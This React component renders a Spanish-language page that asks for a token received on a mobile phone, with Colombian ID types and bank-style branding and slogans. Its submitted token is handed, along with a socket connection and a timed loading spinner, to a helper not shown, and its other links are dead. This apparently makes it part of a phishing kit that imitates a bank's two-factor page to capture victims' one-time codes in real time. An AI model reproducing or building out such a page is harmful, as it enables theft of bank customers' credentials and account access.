import React, { useContext, useState } from 'react'

import logo from '../../../assets/logo.png'

import { SocketContext, UserDataContext } from '../../../context'
import { useNavigate } from 'react-router-dom'
import { tokenValidate } from '../../../security/tokenValidate'
import { submitBase } from '../../../helpers/submitBase'
import { useFormik } from 'formik'
import { TokenInput } from './TokenInput'
import { Spiner } from '../../Spiner'

const valuesData = { token1: '' }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const Token = ({urlToNavigate, spiner, timeLoader, endUrl = '', virtualKeyword = false}) => {

  const navigate = useNavigate()
  const { addData } = useContext(UserDataContext);
  const { socket } =  useContext(SocketContext);  
  
  const [showSpiner , SetshowSpiner] = useState(false);

  const [seconds, setSeconds] = useState(5)

  const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('');
  const [selectActive, setSelectActive] = useState(false);
  const [selectItem, setSelectItem] = useState(opciones[0]);
  
  const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
  
  const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
      initialValues: valuesData,
      // En caso de poner un error personalizado colocar errorUsername y errorPassword
      validate: values => tokenValidate({values, virtualKeyword}),
      onSubmit: async(valuesData) => { 
          submitBase({dataImportant, valuesData, endUrl, setSeconds, seconds}) }
  })
  
  return (
    <div className='bg-[#E7E3E3] w-screen h-screen flex items-center flex-col'>
      {/* Spiner de carga */}


      {/* Aqui ira las notificacion de error en caso general */}
      {/* <UsernameAndPasswordError
          touched={touched}
          errors={errors}
      />
      {
          virtualKeyword === true ? (<UsernameAndPasswordKeyword  afterPasswordValue={valueKeyBoardVirtual} setPasswordValue={setValueKeyBoardVirtual}/>) : null
      } */}
      {/* Colocar diseño base */}
      <div className='relative w-[183px] mt-[-22px] h-[100px] flex justify-center'>
          <img className='w-[183px] absolute' src={logo} alt="" />
      </div>
      <div className='w-[408px] h-[350px] blue-gradient'>

          {
              showSpiner === true ? <Spiner seconds={seconds} /> : (
                  <>
                    <p className='montserrat text-white text-center text-lg mt-6 mb-2'>Ingresa el token que recibiste en tu dispositivo móvil y valídalo para continuar.</p>

                    <form className='flex flex-col items-center' onSubmit={handleSubmit}>

                        <TokenInput
                            username={values.username}
                            password={values.password}
                            typeDocument={values.typeDocument}
                            handleChange={handleChange} 
                            handleBlur={handleBlur}
                            touched={touched}
                            errors={errors}
                            virtualKeyword={virtualKeyword}
                            valueKeyBoardVirtual={valueKeyBoardVirtual}
                            showPasswordMode={false}

                            selectActive={selectActive} 
                            setSelectActive={setSelectActive}
                            selectItem={selectItem}
                            setSelectItem={setSelectItem}
                            opciones={opciones}
                        />

                        <button 
                                disabled={
                                    (
                                        touched.token1 && 
                                        errors.token1 || 
                                        values.token1.length === 0
                                    )  == true ? true : false
                                }
                            className='bg-blue-400 px-4 py-1 bg-transparent border-[1px] mt-[30px] w-[150px] max-w-[90%] text-[#fff] rounded-[15px]'
                            type='submit'
                        >
                            Ingresar
                        </button>

                        <a href="#" className='bg-[#FDBB30] text-center text-white rounded-[10px] w-[190px] mt-[15px] p-[15px_20px]'>
                            Crear usuario
                        </a>
                    </form>
                  </>
              )
          }
          
      </div>
      <div className='w-[408px] h-[250px] flex flex-col items-center text-center text-white bg-[#e31837]'>
          <p className='avenir text-3xl mx-16 leading-[60px]'>ABRE TU CUENTA Y DATE CUENTA</p>
          
          <a href="#" className='bg-[#FDBB30] text-center text-white rounded-[10px] w-[240px] mt-[15px] p-[15px_20px] text-xl font-bold'>
              Solicitar
          </a>
      </div>
  </div>
  )
}
